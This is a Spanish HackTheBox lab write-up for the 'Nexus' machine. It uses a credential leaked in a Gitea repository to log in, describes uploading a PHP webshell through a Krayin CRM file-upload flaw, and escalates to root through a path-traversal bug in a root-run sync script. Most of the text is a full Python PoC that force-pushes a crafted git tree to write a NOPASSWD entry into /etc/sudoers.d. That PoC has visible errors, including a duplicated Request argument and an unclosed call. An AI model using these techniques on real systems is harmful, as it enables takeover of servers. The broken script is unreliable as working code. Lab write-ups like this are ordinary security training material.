Nexus — Easy — HackTheBox — Linux
#

Reconocimiento
#

Comenzamos realizando una fase de reconocimiento básico para verificar la disponibilidad del objetivo y determinar el sistema operativo subyacente.

Escaneo de ICMP (Ping)
#

ping -c1 10.129.41.100
PING 10.129.41.100 (10.129.41.100) 56(84) bytes of data.
64 bytes from 10.129.41.100: icmp_seq=1 ttl=63 time=90.0 ms

El valor del TTL (Time to Live) es 63, lo que sugiere que la máquina objetivo está corriendo un sistema operativo Linux.

Ejecutamos un escaneo exhaustivo de puertos TCP para identificar qué servicios están expuestos en la máquina víctima:

Enumeración
#

1. Enumeración Web con WhatWeb
#

Analizamos el dominio principal nexus.htb para identificar tecnologías y posibles metadatos útiles:

Accedemos a git.nexus.htb y encontramos un portal de Gitea:

Explorando la plataforma de forma anónima, realizamos dos hallazgos clave:

  1. Usuarios registrados: Identificamos al usuario jones dentro de los perfiles de la plataforma.

  2. Fuga de Credenciales en Repositorios: Al revisar los repositorios públicos de jones, detectamos una fuga de credenciales directamente expuesta en el código fuente:

Foothold — Krayin CRM RCE
#

Utilizamos las credenciales obtenidas de Gitea (jones:N27xh!!2ucY04) para iniciar sesión con éxito en el panel de administración de Krayin CRM a través de http://billing.nexus.htb/admin/login.

Una vez autenticados, observamos en el pie de página de la aplicación que se está ejecutando la versión Krayin v2.2.0:

Al buscar vulnerabilidades públicas para esta versión específica, confirmamos que posee múltiples vulnerabilidades críticas reportadas (CVEs):

Entre ellas, la de mayor interés es la vulnerabilidad de File Upload → Remote Code Execution (RCE) (CVE-2026-38526 / CVE-2026-36340). Esta falla permite a los administradores subir archivos arbitrarios adjuntos a un correo electrónico sin la debida validación de extensiones.

Proceso de Explotación Paso a Paso:
#

  1. Iniciamos sesión en la interfaz administrativa de Krayin CRM.
  2. Navegamos a la sección Email ➔ Compose (Redactar).
  3. Escribimos un correo y adjuntamos un archivo PHP malicioso (por ejemplo, una reverse shell o webshell como shell.php).
  4. Enviamos el correo.
  5. El archivo adjunto se guarda automáticamente en el directorio /storage/emails/<id_email>/shell.php.

Al acceder directamente a la URL del archivo subido en http://billing.nexus.htb/storage/emails/<id_email>/shell.php, el servidor ejecuta el archivo PHP, otorgándonos ejecución remota de comandos (RCE) y permitiéndonos recibir una conexión inversa.

Escalada de Privilegios — template-sync.py (Path Traversal)
#

Una vez dentro de la máquina como el usuario www-data, realizamos una enumeración del sistema de archivos y las tareas programadas. Encontramos un timer de systemd ejecutando periódicamente un script como root:

gitea-template-sync.timer ➔ Ejecuta /etc/gitea/template-sync.py (como usuario root)

Análisis del Código Vulnerable
#

Al revisar el código fuente de /etc/gitea/template-sync.py, encontramos el siguiente bloque crítico:

STAGING_DIR = "/home/git/template-staging"
stage_path = os.path.join(STAGING_DIR, owner, name)

for mode, objhash, filepath in entries:
    target = os.path.join(stage_path, filepath)   # ← VULNERABILIDAD: PATH TRAVERSAL
    target_dir = os.path.dirname(target)
    os.makedirs(target_dir, exist_ok=True)
    with open(target, 'wb') as f:
        f.write(blob_content)

Fallo: El parámetro filepath proviene directamente de la estructura del repositorio (git ls-tree -r HEAD). Al no sanitizarse esta entrada, si creamos un archivo en el repositorio cuyo nombre contenga secuencias de salto de directorio (../), el script escribirá el archivo en una ruta externa arbitraria con privilegios de root.

Estrategia de Explotación
#

La ruta donde se clona el template tiene 6 niveles de profundidad respecto al directorio raíz /:

/home/git/template-staging/jones/<repo_name>/

Por lo tanto, necesitamos exactamente 6 secuencias ../ para posicionarnos en la raíz del sistema de archivos (/).

Nuestro objetivo será escribir un archivo de configuración en /etc/sudoers.d/ para otorgarle permisos de sudo ilimitados al usuario jones.

Payload a escribir en /etc/sudoers.d/jones:

jones ALL=(ALL) NOPASSWD: ALL

Ejecución:
#

  1. Creamos un blob de git con el contenido de sudoers deseado.
  2. Construimos manualmente un objeto de tipo tree en git que asocie dicho blob con el nombre de archivo malicioso: ../../../../../../etc/sudoers.d/jones.
  3. Escribimos este objeto de manera directa en el directorio local de git .git/objects/.
  4. Generamos un commit apuntando a este nuevo árbol (tree) y realizamos un empuje forzado (git push -f) a la rama main de nuestro repositorio de plantilla en Gitea.
  5. Esperamos a que el temporizador ejecute /etc/gitea/template-sync.py (corre cada minuto).
  6. Una vez ejecutado, iniciamos sesión por SSH como jones y ejecutamos sudo para obtener una consola como root.
jones@nexus:~$ sudo -n whoami
root

PoC Automatizado
#

Para simplificar y automatizar el ataque de escalada de privilegios a partir de las credenciales de jones, se desarrolló el script cve-template-sync-poc.py.

python3 scripts/cve-template-sync-poc.py <password_jones>

El script se encarga de crear las claves SSH, asociarlas al perfil de Gitea, inicializar el repositorio plantilla malicioso, inyectar el tree object corrupto a bajo nivel, forzar el push, esperar el timer del sistema y finalmente capturar las flags.

"""
CVE-202X-XXXXX: Nexus template-sync.py Path Traversal → Root
===============================================================
El servicio `gitea-template-sync.timer` ejecuta cada minuto
`/etc/gitea/template-sync.py` como **root**, el cual sincroniza
repositorios template de Gitea a `/home/git/template-staging/`.

Vulnerabilidad: `os.path.join(stage_path, filepath)` sin sanitizar
el `filepath` proveniente de `git ls-tree -r HEAD`. Un nombre de
archivo como `../../../../../../etc/sudoers.d/jones` permite
**path traversal** y escribir cualquier archivo como root.

Uso:
    python3 cve-template-sync-poc.py <password_jones>
    Ejemplo: python3 cve-template-sync-poc.py y27xb3ha!!74GbR

Requisitos: credenciales de `jones` en Gitea (nexus.htb / git.nexus.htb)
"""

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import urllib.request
import zlib
import hashlib
import base64

GITEA_URL = "http://git.nexus.htb"
TARGET_SSH = "nexus.htb"
JONES_USER = "jones"

if len(sys.argv) < 2:
    print(f"Uso: {sys.argv[0]} <password_jones>")
    sys.exit(1)

JONES_PASS = sys.argv[1]
SSH_KEY_COMMENT = "kali@kali"

def http(method, path, data=None, auth=True):
    url = f"{GITEA_URL}{path}"
    headers = {"Content-Type": "application/json"}
    if auth:
        creds = base64.b64encode(f"{JONES_USER}:{JONES_PASS}".encode()).decode()
        headers["Authorization"] = f"Basic {creds}"
    req = urllib.request.Request(url, url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req) as r:
            return json.loads(r.read())
    except urllib.error.HTTPError as e:
        print(f"  [!] HTTP {e.code}: {e.read().decode()}")
        return None

def run(*args, **kwargs):
    return subprocess.run(args, capture_output=True, **kwargs)

def git_tree_with_path(blob_hex, traversal_path_bytes):
    """Create a raw git tree object with one entry at traversal_path."""
    bh = bytes.fromhex(blob_hex)
    entry = b"100644 " + traversal_path_bytes + b"\x00" + bh
    header = b"tree " + str(len(entry)).encode() + b"\x00"
    content = header + entry
    tree_hash = hashlib.sha1(content).hexdigest()

    obj_dir = os.path.join(poc_dir, ".git", "objects", tree_hash[:2])
    os.makedirs(obj_dir, exist_ok=True)
    with open(os.path.join(obj_dir, tree_hash[2:]), "wb") as f:
        f.write(zlib.compress(content))
    return tree_hash

def push_commit(tree_hash, msg="pwn"):
    """Create a root commit with the given tree and force-push to main."""
    commit = run("git", "commit-tree", tree_hash, "-m", msg,
                 cwd=poc_dir, text=True,
                 env={**os.environ,
                      "GIT_AUTHOR_NAME": "jones",
                      "GIT_AUTHOR_EMAIL": "j@j",
                      "GIT_COMMITTER_NAME": "jones",
                      "GIT_COMMITTER_EMAIL": "j@j"})
    ch = commit.stdout.strip()
    run("git", "update-ref", "refs/heads/main", ch, cwd=poc_dir)
    p = run("git", "push", "-f", "origin", "main", cwd=poc_dir, text=True)
    print(f"  push: {p.stdout}{p.stderr}")
    return ch

print("[*] PoC: jones → root via template-sync.py path traversal")
print()

poc_dir = tempfile.mkdtemp(prefix="nexus_poc_")

print("[1] Generating SSH keys...")
run("ssh-keygen", "-f", f"{poc_dir}/ssh-git", "-N", "", "-C", SSH_KEY_COMMENT)
run("ssh-keygen", "-f", f"{poc_dir}/ssh-root", "-N", "")

with open(f"{poc_dir}/ssh-git.pub") as f:
    git_pub = f.read().strip()
with open(f"{poc_dir}/ssh-root.pub") as f:
    root_pub = f.read().strip()

print(f"    git key  comment: {SSH_KEY_COMMENT}")
print(f"    root key: {root_pub[:50]}...")

print("[2] Adding SSH key to Gitea...")
http("POST", "/api/v1/user/keys",
     json.dumps({"title": "git-key", "key": git_pub}).encode())
print("    OK")

print("[3] Creating template repo 'exploit-template'...")

http("DELETE", f"/api/v1/repos/{JONES_USER}/exploit-template")

r = http("POST", "/api/v1/user/repos",
         json.dumps({"name": "exploit-template",
                     "auto_init": True,
                     "template": True}).encode())
if r:
    print(f"    repo id: {r['id']}")
else:
    print("    [!] failed to create repo")
    sys.exit(1)

print("[4] Pushing tree with path traversal to /etc/sudoers.d/jones...")

repo_url = f"http://{JONES_USER}:{JONES_PASS}@{GITEA_URL[7:]}/{JONES_USER}/exploit-template"
subprocess.run(["git", "clone", repo_url, poc_dir], capture_output=True, text=True)
os.chdir(poc_dir)

run("git", "rm", "README.md", cwd=poc_dir)
run("git", "commit", "--allow-empty", "-m", "clean", cwd=poc_dir,
    env={**os.environ, "GIT_AUTHOR_NAME": "j", "GIT_AUTHOR_EMAIL": "j@j",
         "GIT_COMMITTER_NAME": "j", "GIT_COMMITTER_EMAIL": "j@j"})

sudoers_content = b"jones ALL=(ALL) NOPASSWD: ALL\n"
blob_sudo = run("git", "hash-object", "-w", "--stdin",
                input=sudoers_content, cwd=poc_dir).stdout.decode().strip()

traversal = b"../../../../../../etc/sudoers.d/jones"
tree_hash = git_tree_with_path(blob_sudo, traversal)

r = run("git", "cat-file", "-p", tree_hash, cwd=poc_dir, text=True)
print(f"    tree: {r.stdout.strip()}")

commit_hash = push_commit(tree_hash)
print(f"    commit: {commit_hash}")

print()
print("[5] Waiting for gitea-template-sync.timer (runs every minute)...")
print("    (typically < 60 seconds)")

time.sleep(5)
try:
    result = subprocess.run(
        ["sshpass", "-p", JONES_PASS,
         "ssh", "-o", "StrictHostKeyChecking=no",
         f"{JONES_USER}@{TARGET_SSH}",
         "systemctl status gitea-template-sync.timer 2>/dev/null | grep Trigger"],
        capture_output=True, text=True, timeout=10
    )
    print(f"    {result.stdout.strip()}")
except Exception as e:
    print(f"    (cannot check timer: {e})")

print()
print("[6] Verifying...")
for attempt in range(12):  # wait up to ~2 min
    time.sleep(10)
    try:
        r = subprocess.run(
            ["sshpass", "-p", JONES_PASS,
             "ssh", "-o", "StrictHostKeyChecking=no",
             f"{JONES_USER}@{TARGET_SSH}",
             "sudo -n whoami 2>&1"],
            capture_output=True, text=True, timeout=10
        )
        if "root" in r.stdout.strip():
            print(f"    [+] ROOT via sudo after ~{(attempt+1)*10} seconds!")
            break
    except:
        pass
else:
    print("    [!] Did not get root within 2 minutes")
    print("    Check: sshpass -p '<pass>' ssh jones@nexus.htb 'sudo -n whoami'")
    sys.exit(1)

print()
print("[7] Capturing flags:")
r = subprocess.run(
    ["sshpass", "-p", JONES_PASS,
     "ssh", "-o", "StrictHostKeyChecking=no",
     f"{JONES_USER}@{TARGET_SSH}",
     "cat /home/jones/user.txt; echo; sudo -n -i cat /root/root.txt"],
    capture_output=True, text=True, timeout=10

lines = r.stdout.strip().split("\n")
if len(lines) >= 2:
    print(f"    user.txt: {lines[0]}")
    print(f"    root.txt: {lines[1]}")

print()
print("[8] Cleaning up...")
shutil.rmtree(poc_dir, ignore_errors=True)
http("DELETE", f"/api/v1/repos/{JONES_USER}/exploit-template")

print("[+] Nexus pwned: jones → root via template-sync path traversal")
